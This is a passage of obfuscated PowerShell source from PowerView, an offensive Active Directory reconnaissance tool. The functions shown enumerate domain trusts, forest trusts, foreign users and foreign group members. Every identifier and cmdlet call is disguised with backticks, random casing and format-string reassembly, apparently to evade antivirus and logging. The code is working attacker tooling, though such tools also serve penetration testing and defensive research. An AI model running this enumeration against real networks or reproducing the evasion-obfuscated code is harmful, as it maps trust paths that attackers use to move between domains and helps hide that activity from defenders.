                ${TA`RGeTDc} = ${doma`iN}
            }
            else {
                # see https://msdn.microsoft.com/en-us/library/ms675976(v=vs.85).aspx for default NULL behavior
                ${taRGE`T`DC} = ${N`ULL}
            }

            # arguments for DsEnumerateDomainTrusts
            ${PT`R`INfo} = [IntPtr]::Zero

            # 63 = DS_DOMAIN_IN_FOREST + DS_DOMAIN_DIRECT_OUTBOUND + DS_DOMAIN_TREE_ROOT + DS_DOMAIN_PRIMARY + DS_DOMAIN_NATIVE_MODE + DS_DOMAIN_DIRECT_INBOUND
            ${fl`A`gs} = 63
            ${do`Mai`NCOunt} = 0

            # get the trust information from the target server
            ${rEsu`lt} = ${N`ETA`Pi32}::DsEnumerateDomainTrusts(${Ta`RGE`TDC}, ${fl`AGs}, [ref]${ptR`iN`Fo}, [ref]${DoMAIN`C`Ou`Nt})

            # Locate the offset of the initial intPtr
            ${oFF`Set} = ${P`T`RINfO}.ToInt64()

            # 0 = success
            if ((${R`ESu`Lt} -eq 0) -and (${oF`Fset} -gt 0)) {

                # Work out how much to increment the pointer by finding out the size of the structure
                ${In`Cr`eme`NT} = ${d`S_dOma`i`N_tR`USTs}::GetSize()

                # parse all the result structures
                for (${I} = 0; (${I} -lt ${dO`mAI`N`cOUnt}); ${I}++) {
                    # create a new int ptr at the given offset and cast the pointer as our result structure
                    ${New`I`NTPtr} = &("{0}{1}{2}" -f'Ne','w-Ob','ject') ("{2}{1}{0}" -f 'ptr','Int','System.') -ArgumentList ${OfF`s`ET}
                    ${In`Fo} = ${N`eW`INtptr} -as ${D`S_DOm`Ai`N_`Tr`UStS}

                    ${o`FfseT} = ${N`EWI`NTP`TR}.ToInt64()
                    ${ofF`seT} += ${iNc`REME`Nt}

                    ${sid`S`TrING} = ''
                    ${rEs`U`lt} = ${A`DVa`p`i32}::ConvertSidToStringSid(${in`FO}.DomainSid, [ref]${S`IDst`RiNG});${L`AST`eRror} = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                    if (${Res`Ult} -eq 0) {
                        &("{2}{0}{1}{3}"-f'-Ver','bos','Write','e') "[Get-DomainTrust] Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
                    }
                    else {
                        ${d`OmAin`TRu`ST} = &("{2}{0}{1}" -f '-','Object','New') ("{0}{1}"-f 'PSO','bject')
                        ${doMa`inTRU`sT} | &("{1}{0}{2}{3}"-f 'dd-','A','Memb','er') ("{2}{0}{1}{3}" -f 'ot','epr','N','operty') 'SourceName' ${souR`cE`dom`AIn}
                        ${domA`inT`R`Ust} | &("{1}{3}{0}{2}"-f'mbe','Add','r','-Me') ("{1}{0}{2}{3}"-f'e','Noteprop','r','ty') 'TargetName' ${i`NFo}.DnsDomainName
                        ${doMa`i`N`TruSt} | &("{2}{0}{1}"-f 'M','ember','Add-') ("{2}{1}{0}" -f'y','tepropert','No') 'TargetNetbiosName' ${i`NfO}.NetbiosDomainName
                        ${D`OmaIntr`U`sT} | &("{1}{0}{2}" -f'em','Add-M','ber') ("{0}{2}{1}"-f 'No','erty','teprop') 'Flags' ${In`Fo}.Flags
                        ${dOMAI`NtR`USt} | &("{0}{1}{2}" -f'A','dd-M','ember') ("{0}{2}{1}"-f'Notep','operty','r') 'ParentIndex' ${i`Nfo}.ParentIndex
                        ${dO`maINtRu`sT} | &("{0}{1}{2}"-f 'Ad','d-M','ember') ("{1}{0}{2}"-f 'eprope','Not','rty') 'TrustType' ${IN`FO}.TrustType
                        ${Dom`AinT`RUST} | &("{1}{0}{3}{2}"-f'dd-Me','A','er','mb') ("{1}{2}{0}{3}" -f'per','Notepr','o','ty') 'TrustAttributes' ${i`NFo}.TrustAttributes
                        ${do`M`AINtr`UST} | &("{2}{1}{0}"-f 'Member','-','Add') ("{1}{2}{0}" -f 'y','Note','propert') 'TargetSid' ${s`IDsTR`ing}
                        ${D`OMai`N`TRust} | &("{0}{1}{2}" -f 'Ad','d-','Member') ("{3}{1}{0}{2}" -f'ope','otepr','rty','N') 'TargetGuid' ${In`Fo}.DomainGuid
                        ${Do`MAINT`RUST}.PSObject.TypeNames.Insert(0, 'PowerView.DomainTrust.API')
                        ${D`o`mA`Intrust}
                    }
                }
                # free up the result buffer
                ${nu`lL} = ${nE`Ta`Pi32}::NetApiBufferFree(${ptrI`NfO})
            }
            else {
                &("{0}{3}{2}{4}{1}"-f'Write-Ve','e','bo','r','s') "[Get-DomainTrust] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
            }
        }
        else {
            # if we're searching for domain trusts through .NET methods
            ${F`Ou`ND`dOMAin} = &("{1}{0}{2}{3}" -f '-','Get','Doma','in') @NetSearcherArguments
            if (${fO`UNd`dOmA`iN}) {
                ${fo`UNd`D`OMaIN}.GetAllTrustRelationships() | &("{2}{3}{1}{0}" -f 't','bjec','ForE','ach-O') {
                    ${_}.PSObject.TypeNames.Insert(0, 'PowerView.DomainTrust.NET')
                    ${_}
                }
            }
        }
    }
}


function Ge`T-Fo`Re`Stt`RUst {
<#
.SYNOPSIS

Return all forest trusts for the current forest or a specified forest.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-Forest  

.DESCRIPTION

This function will enumerate domain trust relationships for the current (or a remote)
forest using number of method using the .NET method GetAllTrustRelationships() on a
System.DirectoryServices.ActiveDirectory.Forest returned by Get-Forest.

.PARAMETER Forest

Specifies the forest to query for trusts, defaults to the current forest.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-ForestTrust

Return current forest trusts.

.EXAMPLE

Get-ForestTrust -Forest "external.local"

Return trusts for the "external.local" forest.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-ForestTrust -Forest "external.local" -Credential $Cred

Return trusts for the "external.local" forest using the specified alternate credenitals.

.OUTPUTS

PowerView.DomainTrust.NET

A TrustRelationshipInformationCollection returned when using .NET methods (default).
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ForestTrust.NET')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${T`RuE}, ValueFromPipelineByPropertyName = ${tr`UE})]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        ${Fo`ResT},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cRE`D`E`NtiAl} = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ${neT`FORe`st`ArGuMEnts} = @{}
        if (${PSb`oun`D`PAr`AMEtErs}['Forest']) { ${net`FOrE`S`TAr`GumEn`Ts}['Forest'] = ${F`or`eSt} }
        if (${PS`B`OU`NDpar`AmE`TErS}['Credential']) { ${Net`ForEs`TArgu`m`E`NTS}['Credential'] = ${cre`D`EntiaL} }

        ${Fo`UNdfore`ST} = &("{1}{2}{0}{3}" -f 'es','Ge','t-For','t') @NetForestArguments

        if (${FOUnD`F`OREST}) {
            ${f`OUNdFo`RESt}.GetAllTrustRelationships() | &("{1}{3}{0}{2}" -f'ch-Obj','ForE','ect','a') {
                ${_}.PSObject.TypeNames.Insert(0, 'PowerView.ForestTrust.NET')
                ${_}
            }
        }
    }
}


function GET-dOmAI`Nf`O`R`EiGNUs`er {
<#
.SYNOPSIS

Enumerates users who are in groups outside of the user's domain.
This is a domain's "outgoing" access.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-Domain, Get-DomainUser  

.DESCRIPTION

Uses Get-DomainUser to enumerate all users for the current (or target) domain,
then calculates the given user's domain name based on the user's distinguishedName.
This domain name is compared to the queried domain, and the user object is
output if they differ.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER SecurityMasks

Specifies an option for examining security information of a directory object.
One of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainForeignUser

Return all users in the current domain who are in groups not in the
current domain.

.EXAMPLE

Get-DomainForeignUser -Domain dev.testlab.local

Return all users in the dev.testlab.local domain who are in groups not in the
dev.testlab.local domain.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainForeignUser -Domain dev.testlab.local -Server secondary.dev.testlab.local -Credential $Cred

Return all users in the dev.testlab.local domain who are in groups not in the
dev.testlab.local domain, binding to the secondary.dev.testlab.local for queries, and
using the specified alternate credentials.

.OUTPUTS

PowerView.ForeignUser

Custom PSObject with translated user property fields.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ForeignUser')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${Tr`UE}, ValueFromPipelineByPropertyName = ${t`RUe})]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        ${dOm`A`In},

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        ${LdaPfi`L`TeR},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${Pr`Op`ERti`Es},

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        ${seA`Rchba`Se},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${S`E`RVER},

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        ${SEArCh`s`Co`pE} = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        ${reSu`LTPA`GeS`izE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${S`erV`eRTIMeli`m`IT},

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        ${S`Ec`URiTYm`ASks},

        [Switch]
        ${to`m`BSTO`NE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CREDEnt`I`Al} = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        ${sea`RChE`RAR`gUmENtS} = @{}
        ${Se`ArCHerAr`g`U`MEnTs}['LDAPFilter'] = '(memberof=*)'
        if (${p`sboU`Nd`paRaMEtERS}['Domain']) { ${SeARCHE`RAR`gU`MentS}['Domain'] = ${DO`Ma`iN} }
        if (${pS`BO`UNDpaRam`eTErs}['Properties']) { ${Searc`herA`RgU`meNTS}['Properties'] = ${prO`peRTI`eS} }
        if (${P`s`BouNDPARa`me`T`ERS}['SearchBase']) { ${SEarC`HERA`RG`Uments}['SearchBase'] = ${se`AR`cHbASe} }
        if (${PS`BOU`NDPa`RameTErs}['Server']) { ${S`earCHer`A`RGu`m`ents}['Server'] = ${S`eRveR} }
        if (${PsBOUnd`P`A`RAMeTeRS}['SearchScope']) { ${seArchE`R`ArguM`EN`Ts}['SearchScope'] = ${S`eA`RChsC`oPe} }
        if (${Ps`BOUnD`PAr`AmE`Te`Rs}['ResultPageSize']) { ${s`eArCHE`R`ArGUM`ENTS}['ResultPageSize'] = ${rEsuLTP`AgEs`I`ZE} }
        if (${PS`Bo`UndParaMetE`Rs}['ServerTimeLimit']) { ${S`earcheR`AR`gUme`NtS}['ServerTimeLimit'] = ${s`E`Rv`erTiMEL`iMIt} }
        if (${Ps`BO`Undp`ARAme`TeRs}['SecurityMasks']) { ${S`e`Ar`CHE`RArGume`NTS}['SecurityMasks'] = ${S`Ec`UriTYmASKs} }
        if (${p`sbOUNDpa`RAM`E`TErS}['Tombstone']) { ${SE`ARc`HErArGU`MENTs}['Tombstone'] = ${To`m`BstoNE} }
        if (${PsBOUND`p`A`Ra`met`ers}['Credential']) { ${SEarc`h`EraRGUmeN`TS}['Credential'] = ${CRE`DENtI`AL} }
        if (${p`S`B`oUNdpAr`AMET`ErS}['Raw']) { ${searCHeR`ARgum`En`TS}['Raw'] = ${r`Aw} }
    }

    PROCESS {
        &("{0}{2}{1}" -f'Get-Domai','User','n') @SearcherArguments  | &("{0}{1}{2}{3}" -f 'F','o','rEach-','Object') {
            ForEach (${MEMb`e`RsH`ip} in ${_}.memberof) {
                ${in`dex} = ${meMB`e`RsH`iP}.IndexOf('DC=')
                if (${IN`DeX}) {

                    ${gR`OUPd`Om`AiN} = $(${MeM`B`eRs`hiP}.SubString(${i`N`DEx})) -replace 'DC=','' -replace ',','.'
                    ${USeR`Di`StI`NgUISHedn`A`ME} = ${_}.distinguishedname
                    ${u`SeR`INDex} = ${Us`ErdI`STIng`UIsHeDnaMe}.IndexOf('DC=')
                    ${uSER`do`mA`IN} = $(${_}.distinguishedname.SubString(${use`Rin`DeX})) -replace 'DC=','' -replace ',','.'

                    if (${GROupDo`Ma`iN} -ne ${U`S`e`RDOmaIn}) {
                        # if the group domain doesn't match the user domain, display it
                        ${gR`O`Up`NAmE} = ${m`emBEr`SHip}.Split(',')[0].split('=')[1]
                        ${FoR`eiGnu`sEr} = &("{1}{2}{0}" -f'ct','New','-Obje') ("{2}{0}{1}" -f'je','ct','PSOb')
                        ${FO`RE`iG`NUser} | &("{0}{2}{1}"-f 'Ad','ember','d-M') ("{2}{0}{3}{1}"-f'otepro','ty','N','per') 'UserDomain' ${u`SE`RD`OmaIn}
                        ${fo`R`EigNUsER} | &("{1}{2}{3}{0}"-f 'r','Add-Mem','b','e') ("{2}{3}{0}{1}" -f'pert','y','Notepr','o') 'UserName' ${_}.samaccountname
                        ${f`orEi`Gn`USEr} | &("{1}{0}{2}" -f'-','Add','Member') ("{2}{0}{1}"-f'per','ty','Notepro') 'UserDistinguishedName' ${_}.distinguishedname
                        ${forEI`G`NUSEr} | &("{2}{1}{0}"-f 'r','Membe','Add-') ("{2}{0}{3}{1}" -f 'op','y','Notepr','ert') 'GroupDomain' ${gR`ouPd`OmA`IN}
                        ${FO`Re`Ign`UsEr} | &("{2}{3}{0}{1}"-f'Membe','r','Ad','d-') ("{3}{2}{0}{1}"-f 'r','operty','p','Note') 'GroupName' ${GROu`p`NAme}
                        ${F`orEI`gNUs`Er} | &("{0}{1}{2}" -f 'Add-Mem','be','r') ("{0}{1}{2}" -f 'Not','eprope','rty') 'GroupDistinguishedName' ${mE`mBe`RsHip}
                        ${F`oReI`GNU`SeR}.PSObject.TypeNames.Insert(0, 'PowerView.ForeignUser')
                        ${FOREi`g`Nus`Er}
                    }
                }
            }
        }
    }
}


function geT-d`OMAInf`orEigNG`RouPme`mbER {
<#
.SYNOPSIS

Enumerates groups with users outside of the group's domain and returns
each foreign member. This is a domain's "incoming" access.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-Domain, Get-DomainGroup  

.DESCRIPTION

Uses Get-DomainGroup to enumerate all groups for the current (or target) domain,
then enumerates the members of each group, and compares the member's domain
name to the parent group's domain name, outputting the member if the domains differ.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER SecurityMasks

Specifies an option for examining security information of a directory object.
One of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainForeignGroupMember

Return all group members in the current domain where the group and member differ.

.EXAMPLE

Get-DomainForeignGroupMember -Domain dev.testlab.local

Return all group members in the dev.testlab.local domain where the member is not in dev.testlab.local.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainForeignGroupMember -Domain dev.testlab.local -Server secondary.dev.testlab.local -Credential $Cred

Return all group members in the dev.testlab.local domain where the member is
not in dev.testlab.local. binding to the secondary.dev.testlab.local for
queries, and using the specified alternate credentials.

.OUTPUTS

PowerView.ForeignGroupMember

Custom PSObject with translated group member property fields.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ForeignGroupMember')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${t`RUe}, ValueFromPipelineByPropertyName = ${Tr`Ue})]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        ${D`OMa`in},

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        ${L`dAp`Fi`LTEr},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${prOper`T`I`eS},

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        ${S`eA`RchBASE},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${s`ervEr},

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        ${s`eARc`hScOPe} = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        ${REsU`l`TpA`gE`SIze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${sE`R`VeRT`imElI`Mit},

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        ${SeCURITYm`AS`kS},

        [Switch]
        ${TOMB`St`one},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cRe`DEN`T`Ial} = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        ${sear`CHeRArGU`M`En`Ts} = @{}
        ${sE`ARcH`eRargU`M`eN`TS}['LDAPFilter'] = '(member=*)'
        if (${P`sboun`d`pARa`me`TeRS}['Domain']) { ${sE`ARCHE`R`AR`G`UmENts}['Domain'] = ${DOmA`in} }
        if (${psBOUNdP`ARAMEt`E`RS}['Properties']) { ${s`Ea`R`CHErAR`GuMe`NTs}['Properties'] = ${Prop`eR`T`iES} }
        if (${pS`Bo`Undpa`R`AmEtERs}['SearchBase']) { ${Se`ArCHe`R`ARgumENts}['SearchBase'] = ${sea`RCHb`Ase} }
        if (${PSBou`N`d`PAraMEtERs}['Server']) { ${Searc`hErARG`U`Me`NTs}['Server'] = ${S`eR`VeR} }
        if (${psB`oUndPA`R`AmeterS}['SearchScope']) { ${seA`RCHE`R`ArgUMe`NTs}['SearchScope'] = ${seaRChSc`o`Pe} }
        if (${ps`BOunDPa`RA`MetE`RS}['ResultPageSize']) { ${S`ea`Rc`hERA`RGU`meNTS}['ResultPageSize'] = ${RESUL`T`PaGeSIZe} }
        if (${p`sb`ou`NDP`ARaMET`eRS}['ServerTimeLimit']) { ${S`eArc`hE`R`Ar`GuMEntS}['ServerTimeLimit'] = ${S`ErV`e`RtImElimIT} }
        if (${psb`O`Un`dPa`RAmETe`Rs}['SecurityMasks']) { ${sE`ARCh`eRA`RgUmENts}['SecurityMasks'] = ${SeCUrit`Y`MaSKS} }
        if (${Psb`OUNDp`ARA`m`Ete`RS}['Tombstone']) { ${S`e`ArCh`ER`ArG`UmeNts}['Tombstone'] = ${t`oMbSTO`NE} }
        if (${Ps`BO`UndPAra`MetErs}['Credential']) { ${S`eA`RcHe`Rar`g`UmENts}['Credential'] = ${C`RED`e`Ntial} }
        if (${Ps`BoUn`DP`ArAM`et`ErS}['Raw']) { ${Se`ArCH`eRARGUM`E`Nts}['Raw'] = ${R`AW} }
    }

    PROCESS {
        # standard group names to ignore
        ${E`XCL`UD`eGRoUPS} = @('Users', 'Domain Users', 'Guests')

        &("{1}{3}{2}{0}"-f'ainGroup','G','-Dom','et') @SearcherArguments | &("{3}{0}{1}{2}"-f'h','er','e-Object','W') { ${E`XCl`UDEGROu`pS} -notcontains ${_}.samaccountname } | &("{0}{1}{2}{3}"-f'For','Each','-Ob','ject') {
            ${GR`ou`Pna`ME} = ${_}.samAccountName
            ${GROuPdisTI`Ng`UiSHE`dn`AmE} = ${_}.distinguishedname
            ${gRO`U`pDom`Ain} = ${G`ROuP`d`iSTiNgU`isHE`DNAME}.SubString(${GrOU`pd`I`sT`IngUISHed`N`Ame}.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'

            ${_}.member | &("{0}{2}{1}{3}" -f'ForE','b','ach-O','ject') {
                # filter for foreign SIDs in the cn field for users in another domain,
                #   or if the DN doesn't end with the proper DN for the queried domain
                ${M`E`MBErDo`M`AIn} = ${_}.SubString(${_}.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                if ((${_} -match 'CN=S-1-5-21.*-.*') -or (${GRo`UPdO`MAin} -ne ${M`EMBe`RdO`MaIN})) {
                    ${M`EMBerDISt`i`NGu`ISHedNaMe} = ${_}
                    ${MeM`BeR`NaME} = ${_}.Split(',')[0].split('=')[1]

                    ${ForE`I`GnGrO`Up`MEMB`eR} = &("{3}{2}{0}{1}" -f'w-Obj','ect','e','N') ("{1}{0}" -f'ect','PSObj')
                    ${FOr`eIgnG`ROupmE`Mber} | &("{2}{1}{0}"-f 'ber','Mem','Add-') ("{2}{0}{1}"-f 'tepr','operty','No') 'GroupDomain' ${GRO`UpDo`ma`iN}
                    ${fOREiGnGrO`U`Pmemb`Er} | &("{1}{0}{2}" -f 'dd-Memb','A','er') ("{0}{1}{2}"-f'Not','epr','operty') 'GroupName' ${G`ROUpna`me}
                    ${F`OR`EIgNGr`OUPmeMbEr} | &("{0}{2}{1}" -f'Ad','mber','d-Me') ("{1}{3}{0}{2}" -f'pr','No','operty','te') 'GroupDistinguishedName' ${GrOUpd`iStI`NGU`is`h`E`D`NAME}
                    ${fo`ReignGRO`UpM`EmB`er} | &("{2}{1}{0}"-f 'mber','-Me','Add') ("{2}{0}{1}" -f'eprope','rty','Not') 'MemberDomain' ${MembeRdO`m`A`iN}
                    ${Fo`RE`iGngroU`p`MeMB`ER} | &("{0}{2}{1}"-f'A','ember','dd-M') ("{3}{2}{0}{1}"-f'pe','rty','tepro','No') 'MemberName' ${me`mB`eRNAmE}
                    ${F`OrEiGng`R`ou`pmeM`BeR} | &("{2}{0}{1}"-f 'be','r','Add-Mem') ("{2}{1}{0}{3}"-f 'ert','eprop','Not','y') 'MemberDistinguishedName' ${ME`MbERdIs`TiNgu`isH`Edna`me}
                    ${FOreiGNGr`O`Upme`mBer}.PSObject.TypeNames.Insert(0, 'PowerView.ForeignGroupMember')
                    ${FoReIG`NgrO`UPm`eM`BEr}
                }
            }
        }
    }
}


function GET-do`MaIn`Tru`stmaP`pING {
<#
.SYNOPSIS

This function enumerates all trusts for the current domain and then enumerates
all trusts for each domain it finds.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-Domain, Get-DomainTrust, Get-ForestTrust  

.DESCRIPTION

This function will enumerate domain trust relationships for the current domain using
a number of methods, and then enumerates all trusts for each found domain, recursively
mapping all reachable trust relationships. By default, and LDAP search using the filter
'(objectClass=trustedDomain)' is used- if any LDAP-appropriate parameters are specified
LDAP is used as well. If the -NET flag is specified, the .NET method
GetAllTrustRelationships() is used on the System.DirectoryServices.ActiveDirectory.Domain
object. If the -API flag is specified, the Win32 API DsEnumerateDomainTrusts() call is
used to enumerate instead. If any 

.PARAMETER API

Switch. Use an API call (DsEnumerateDomainTrusts) to enumerate the trusts instead of the
built-in LDAP method.

.PARAMETER NET

Switch. Use .NET queries to enumerate trusts instead of the default LDAP method.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainTrustMapping | Export-CSV -NoTypeInformation trusts.csv

Map all reachable domain trusts using .NET methods and output everything to a .csv file.

.EXAMPLE

Get-DomainTrustMapping -API | Export-CSV -NoTypeInformation trusts.csv

Map all reachable domain trusts using Win32 API calls and output everything to a .csv file.

.EXAMPLE

Get-DomainTrustMapping -NET | Export-CSV -NoTypeInformation trusts.csv

Map all reachable domain trusts using .NET methods and output everything to a .csv file.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainTrustMapping -Server 'PRIMARY.testlab.local' | Export-CSV -NoTypeInformation trusts.csv

Map all reachable domain trusts using LDAP, binding to the PRIMARY.testlab.local server for queries
using the specified alternate credentials, and output everything to a .csv file.

.OUTPUTS

PowerView.DomainTrust.LDAP

Custom PSObject with translated domain LDAP trust result fields (default).

PowerView.DomainTrust.NET

A TrustRelationshipInformationCollection returned when using .NET methods.

PowerView.DomainTrust.API

Custom PSObject with translated domain API trust result fields.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DomainTrust.NET')]
    [OutputType('PowerView.DomainTrust.LDAP')]
    [OutputType('PowerView.DomainTrust.API')]
    [CmdletBinding(DefaultParameterSetName = 'LDAP')]
    Param(
        [Parameter(ParameterSetName = 'API')]
        [Switch]
        ${A`PI},

        [Parameter(ParameterSetName = 'NET')]
        [Switch]
        ${n`Et},

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        ${L`d`ApfILt`ER},

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${propeR`T`ieS},

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        ${sE`AR`CHBASe},

        [Parameter(ParameterSetName = 'LDAP')]
        [Parameter(ParameterSetName = 'API')]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${seRv`er},

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        ${s`eArChS`Co`PE} = 'Subtree',

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        ${ReS`ULtPa`gEsi`ze} = 200,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        ${s`ErveRTI`Me`lim`It},

        [Parameter(ParameterSetName = 'LDAP')]
        [Switch]
        ${toMb`stO`Ne},

        [Parameter(ParameterSetName = 'LDAP')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`R`eDe`NTiAl} = [Management.Automation.PSCredential]::Empty
    )

    # keep track of domains seen so we don't hit infinite recursion
    ${sE`enDoMAi`Ns} = @{}

    # our domain status tracker
    ${DO`MaI`Ns} = &("{1}{0}{2}{3}"-f 'ew-Ob','N','j','ect') ("{0}{2}{4}{1}{3}"-f'S','le','yst','ctions.Stack','em.Col')

    ${D`om`AIN`TRUsT`ArGUmentS} = @{}
    if (${Ps`BOUnDP`ARAM`eTe`RS}['API']) { ${dOmA`INTRUs`T`ARGuME`NtS}['API'] = ${A`PI} }
    if (${psBoU`NDp`AraM`Et`ers}['NET']) { ${domA`I`NTRUS`Tar`GU`MENTs}['NET'] = ${N`et} }
    if (${P`Sb`OUn`dPARAMEt`E`Rs}['LDAPFilter']) { ${Dom`A`InT`RusTARgumENTS}['LDAPFilter'] = ${LDAp`F`Il`TeR} }
    if (${PSbou`NDPA`R`AmetERS}['Properties']) { ${dOmAINt`Rus`TA`RgUMentS}['Properties'] = ${P`R`OpErTieS} }
    if (${psbO`U`NdPar`AmeTE`Rs}['SearchBase']) { ${do`M`AI`NtRu`Sta`RgUMeNts}['SearchBase'] = ${sEa`RChB`A`Se} }
    if (${ps`BoUnDPara`m`ETErs}['Server']) { ${Do`MAi`NTR`US`Targ`UMEnts}['Server'] = ${SeR`VeR} }
    if (${PsBOUN`dp`A`Ram`E`TERS}['SearchScope']) { ${dOmaIN`TrUs`Ta`R`gUMenTS}['SearchScope'] = ${sEa`R`Ch`SCOPE} }
